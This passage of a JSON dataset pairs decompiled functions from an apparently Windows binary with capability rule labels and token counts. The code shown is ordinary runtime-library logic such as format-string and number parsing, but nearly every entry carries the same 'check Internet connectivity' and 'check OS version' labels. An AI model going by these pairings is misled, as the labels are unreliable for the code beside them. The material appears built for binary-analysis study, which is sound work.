5);\n        cVar4 = fcn.00401181();\n        if (cVar2 == cVar4) {\n            puVar8 = fcn.00401357();\n            iVar11 = *(unaff_EBP + -0x80);\n            *puVar12 = **puVar8;\n            puVar12 = puVar12 + 1;\n            *(unaff_EBP + -0x84) = puVar12;\n            fcn.00401c7b();\n        }\n        else {\n            iVar11 = *(unaff_EBP + -0x80);\n        }\n    }\n    if (*(unaff_EBP + -0x70) == 0) {\n        cVar2 = fcn.00404011(uVar15);\n        if (cVar2 == '\\0') {\n            iVar14 = *(unaff_EBP + -0x6c);\n            do {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                if (*(iVar11 + 5) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar14 = iVar14 + -1;\n                fcn.00401c7b();\n                cVar2 = fcn.00404011(uVar15);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x6c) = iVar14;\n            puVar12 = *(unaff_EBP + -0x84);\n        }\n        iVar14 = *(unaff_EBP + -0x6c);\n        if (iVar14 < 0) {\n            *puVar12 = 0x30;\n            puVar12 = puVar12 + 1;\n            *(unaff_EBP + -0x6c) = iVar14 + 1;\n        }\n    }\n    while (cVar2 = fcn.00404011(uVar15),  cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        uVar6 = fcn.00402784(unaff_EBP + -0x30, *(iVar11 + 5));\n        if (0x15 < uVar6) break;\n        iVar14 = *(unaff_EBP + -0x70);\n        if (iVar14 < *(unaff_EBP + -0x90)) {\n            *puVar12 = *(uVar6 + 0x553e04);\n            puVar12 = puVar12 + 1;\n            *(unaff_EBP + -0x70) = iVar14 + 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.00401c7b();\n    }\n    cVar2 = *(unaff_EBP + -0x61);\n    puVar13 = puVar12;\n    if (cVar2 == '\\0') goto code_r0x00467a89;\n    cVar2 = fcn.00404011(uVar15);\n    if (cVar2 != '\\0') {\ncode_r0x00467a86:\n        cVar2 = *(unaff_EBP + -0x61);\ncode_r0x00467a89:\n        if ((*(unaff_EBP + -99) != '\\0') || (cVar2 == '\\0')) {\n            puVar13 = *(unaff_EBP + -0x88);\n        }\n        puVar8 = *(unaff_EBP + -0x94);\n        uVar15 = *(unaff_EBP + -0x6c);\n        *puVar13 = 0;\n        *puVar8 = uVar15;\n        fcn.00402a0e();\n        fcn.004068fc();\n        return;\n    }\n    if (*(iVar11 + 4) == '\\0') {\n        fcn.004019e7();\n    }\n    cVar2 = *(iVar11 + 5);\n    if (cVar2 != *(unaff_EBP + -0x15)) {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n            cVar2 = *(iVar11 + 5);\n        }\n        if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x00467a86;\n    }\n    *puVar12 = 0x70;\n    puVar13 = puVar12 + 1;\n    fcn.00401c7b();\n    *(unaff_EBP + -0x61) = 0;\n    iVar14 = 0;\n    cVar2 = fcn.00404011(*(unaff_EBP + -0x68));\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(iVar11 + 5);\n        if (cVar2 == *(unaff_EBP + -0x19)) {\n            *puVar13 = 0x2b;\n        }\n        else {\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(iVar11 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x1a)) goto code_r0x004679ec;\n            *puVar13 = 0x2d;\n        }\n        puVar13 = puVar12 + 1;\n        fcn.00401c7b();\n    }\ncode_r0x004679ec:\n    cVar2 = fcn.00404011(*(unaff_EBP + -0x68));\n    if (cVar2 == '\\0') {\n        do {\n            cVar4 = *(iVar11 + 4);\n            cVar2 = *(unaff_EBP + -0x61);\n            *(unaff_EBP + -0x61) = cVar2;\n            if (cVar4 == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(unaff_EBP + -0x61);\n            }\n            if (*(iVar11 + 5) != *(unaff_EBP + -0x30)) {\n                if (cVar2 == '\\0') goto code_r0x00467a3b;\n                break;\n            }\n            *(unaff_EBP + -0x61) = 1;\n            fcn.00401c7b();\n            cVar2 = fcn.00404011(*(unaff_EBP + -0x68));\n        } while (cVar2 == '\\0');\n        *puVar13 = 0x30;\n        puVar13 = puVar13 + 1;\n    }\ncode_r0x00467a3b:\n    do {\n        cVar2 = fcn.00404011(*(unaff_EBP + -0x68));\n        if (cVar2 != '\\0') goto code_r0x00467a86;\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        uVar6 = fcn.00402784(unaff_EBP + -0x30, *(iVar11 + 5));\n        if (0x15 < uVar6) goto code_r0x00467a86;\n        if (iVar14 < 8) {\n            *puVar13 = *(uVar6 + 0x553e04);\n            puVar13 = puVar13 + 1;\n            iVar14 = iVar14 + 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.00401c7b();\n    } while( true );\n}\n",
        "token_count": 5429
    },
    "00406717": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406717(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f6c8, 8);\n    if (0 < *0x573c4c) {\n        if (((*(unaff_EBP + 8) & 0x40) == 0) || (*0x571e74 == 0)) {\n            *(unaff_EBP + 8) = *(unaff_EBP + 8) & 0xffffffbf;\n        }\n        else {\n            *(unaff_EBP + -4) = 0;\n            *(unaff_EBP + -4) = 0xfffffffe;\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return;\n}\n",
        "token_count": 217
    },
    "00406726": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00406726(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            double *arg_24h)\n\n{\n    uint32_t *puVar1;\n    double *pdVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_328h;\n    uint *var_324h;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pdVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.00405867(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x0047947d:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00405ff6(&var_31ch, &var_324h, arg_10h_00, &var_328h);\n        *pdVar2 = fVar4;\n        if ((var_324h == &var_31ch) || (var_328h != 0)) goto code_r0x0047947d;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x00479489;\n        fVar4 = fcn.00402bf3(SUB84(fVar4, 0), fVar4 >> 0x20, var_320h << 2);\n    }\n    *pdVar2 = fVar4;\ncode_r0x00479489:\n    cVar3 = fcn.0040650f(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.004030bc(unaff_EBX);\n    return;\n}\n",
        "token_count": 565
    },
    "0040677b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040677b(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0040117c(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 352
    },
    "0040678f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040678f(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == NULL) {\n        arg_10h = 0x575718;\n    }\n    uVar1 = (arg_ch & 0xffff) + 0x2400;\n    if (*arg_10h == 0) {\n        if (0x3ff < uVar1) {\n            if (0x3ff < arg_ch + 0x2800U) {\n                uVar2 = fcn.00402766(arg_8h, arg_ch & 0xffff, arg_10h);\n                return uVar2;\n            }\n            *arg_10h = ((arg_ch & 0x27ff) + 0x40) * 0x400;\n            return 0;\n        }\n    }\n    else if (uVar1 < 0x400) {\n        var_8h = 0;\n        var_4h = 0;\n        uVar2 = fcn.00402766(arg_8h, (arg_ch & 0x23ff) + *arg_10h, &var_8h);\n        *arg_10h = 0;\n        arg_10h[1] = 0;\n        return uVar2;\n    }\n    uVar2 = fcn.00402617(arg_10h);\n    return uVar2;\n}\n",
        "token_count": 349
    },
    "0041eaa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041eaa0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004049f8();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 96
    },
    "004067b2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004067b2(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint *in_ECX;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch < 1)) {\n        *(in_ECX + 1) = 2;\n        return;\n    }\n    if (arg_ch == 1) {\n        ppcVar3 = fcn.0040528b(8);\n        if (ppcVar3 != NULL) {\n            uVar1 = *arg_8h;\n            *ppcVar3 = vtable.charNode.0;\n            *(ppcVar3 + 1) = uVar1;\n            goto code_r0x0048b6ff;\n        }\n    }\n    else {\n        iVar2 = fcn.0040528b(0xc);\n        if (iVar2 != 0) {\n            ppcVar3 = fcn.00401131(arg_8h, arg_ch);\n            goto code_r0x0048b6ff;\n        }\n    }\n    ppcVar3 = NULL;\ncode_r0x0048b6ff:\n    *in_ECX = ppcVar3;\n    if (ppcVar3 == NULL) {\n        *(in_ECX + 1) = 3;\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "004067f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004067f3(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.00403a35();\n        *puVar6 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a1164:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a1168:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a116b:\n            cVar4 = fcn.00401e33(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a1110:\n                arg_8h = 0x10;\n                goto code_r0x004a116b;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a1124;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a10f8;\n                }\n            }\ncode_r0x004a1174:\n            cVar4 = fcn.0040100f();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405e8e();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a1174;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a1124:\n            cVar4 = fcn.00402fd1(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004067c6();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a1174;\n            if (cVar4 == 'i') goto code_r0x004a1164;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00403558();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004043fe();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a1110;\n            }\n            goto code_r0x004a1168;\n        }\ncode_r0x004a10f8:\n        cVar4 = fcn.00404d2c();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x004a11fa;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a11fa:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00404039(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.0040549d(&uStack8, arg_ch, arg_14h);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00404039(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00401843(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00404039(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2360
    },
    "0040680c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040680c(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iStack44;\n    int32_t iStack40;\n    \n    iStack40 = 0x61;\n    while (0 < iStack40) {\n        arg_8h = iStack40 + -1;\n        iStack40 = arg_8h;\n    }\n    iStack44 = 0x29;\n    while (0 < iStack44) {\n        arg_8h = iStack44 + -1;\n        iStack44 = arg_8h;\n    }\n    return arg_8h;\n}\n",
        "token_count": 141
    },
    "00406820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00406820(void)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if ((-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) && (fcn.00403f58(&var_4h),  var_4h == 1)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 102
    },
    "00406848": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406848(uint8_t **arg_8h, uint arg_ch)\n\n{\n    uint8_t *arg_8h_00;\n    uint8_t uVar1;\n    uint *in_ECX;\n    uint8_t *puVar2;\n    int32_t arg_ch_00;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    arg_8h_00 = *arg_8h;\n    uVar1 = *arg_8h_00;\n    if (uVar1 != 0) {\n        arg_ch_00 = 0;\n        puVar2 = arg_8h_00;\n        do {\n            if (uVar1 == arg_ch) break;\n            if ((*(uVar1 + 0x555c90) == '\\0') && ((*0x574460 & 0x10000) == 0)) {\n                *(in_ECX + 1) = 2;\n                return;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            puVar2 = puVar2 + 1;\n            *arg_8h = puVar2;\n            uVar1 = *puVar2;\n        } while (uVar1 != 0);\n        fcn.00405a3d(arg_8h_00, arg_ch_00);\n        uVar1 = **arg_8h;\n        if (uVar1 != 0) {\n            *arg_8h = *arg_8h + 1;\n            if (uVar1 == arg_ch) {\n                return;\n            }\n            *in_ECX = 0;\n            *(in_ECX + 1) = 3;\n            return;\n        }\n        if (*(in_ECX + 1) != '\\0') {\n            return;\n        }\n    }\n    *(in_ECX + 1) = 1;\n    return;\n}\n",
        "token_count": 418
    },
    "00406866": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406866(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "00406889": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.00406889(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    var_8h = 0;\n    var_4h = 0;\n    fcn.00404557(0x26);\n    uVar1 = fcn.00403a80(&var_10h);\n    fcn.00402eeb(uVar1);\n    if ((var_4h < '\\x02') && (**0x574458 == '@')) {\n        *0x574458 = *0x574458 + 1;\n        var_10h = 0x555750;\n        var_ch = 2;\n        fcn.00405d71(&var_10h);\n        uVar1 = fcn.0040295a(&var_10h, 0, 0);\n        fcn.00402eeb(uVar1);\n        if (**0x574458 == '@') {\n            *0x574458 = *0x574458 + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n    }\n    arg_8h[1] = 0;\n    *(arg_8h + 1) = 2;\n    *arg_8h = 0;\n    return arg_8h;\n}\n",
        "token_count": 368
    },
    "004068e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.004068e3(uint *arg_8h)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint uVar3;\n    char *pcVar4;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.00405498(&var_8h);\n    if (var_4h < '\\x02') {\n        fcn.00403d55(0x7b);\n        bVar2 = false;\n        pcVar4 = *0x574458;\n        do {\n            if (bVar2) {\n                fcn.00403d55(0x2c);\n                pcVar4 = *0x574458;\n            }\n            cVar1 = *pcVar4;\n            if (cVar1 == '2') {\n                *0x574458 = pcVar4 + 1;\n                uVar3 = fcn.004068e3(&var_30h);\ncode_r0x00492fea:\n                fcn.00402eeb(uVar3);\n                pcVar4 = *0x574458;\n            }\n            else {\n                if (cVar1 == '3') {\n                    *0x574458 = pcVar4 + 1;\n                    uVar3 = fcn.004046b5(&var_28h);\n                    goto code_r0x00492fea;\n                }\n                if (cVar1 == '4') {\n                    *0x574458 = pcVar4 + 1;\n                    uVar3 = fcn.004028a6(&var_20h);\n                    goto code_r0x00492fea;\n                }\n                if (cVar1 != '@') {\n                    uVar3 = fcn.00405498(&var_10h);\n                    fcn.00402eeb(uVar3);\n                    fcn.00403d55(0x3a);\n                    uVar3 = fcn.00403e8b(&var_18h);\n                    goto code_r0x00492fea;\n                }\n            }\n            if ('\\x01' < var_4h) break;\n            if (*pcVar4 == '@') {\n                *0x574458 = pcVar4 + 1;\n                fcn.00403d55(0x7d);\n                *arg_8h = var_8h;\n                arg_8h[1] = var_4h;\n                return arg_8h;\n            }\n            bVar2 = true;\n        } while( true );\n    }\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 663
    },
    "00406906": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x004b78e8)\n// WARNING: Removing unreachable block (ram,0x004b7a0e)\n\nuint __cdecl\nfcn.00406906(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint arg_10h_00;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar10 = CONCAT44(arg_ch, arg_8h);\n    if (arg_ch == 0) {\n        iVar3 = 0x1f;\n        if (arg_8h != 0) {\n            for (; arg_8h >> iVar3 == 0; iVar3 = iVar3 + -1) {\n            }\n        }\n        if (arg_8h == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = iVar3 + 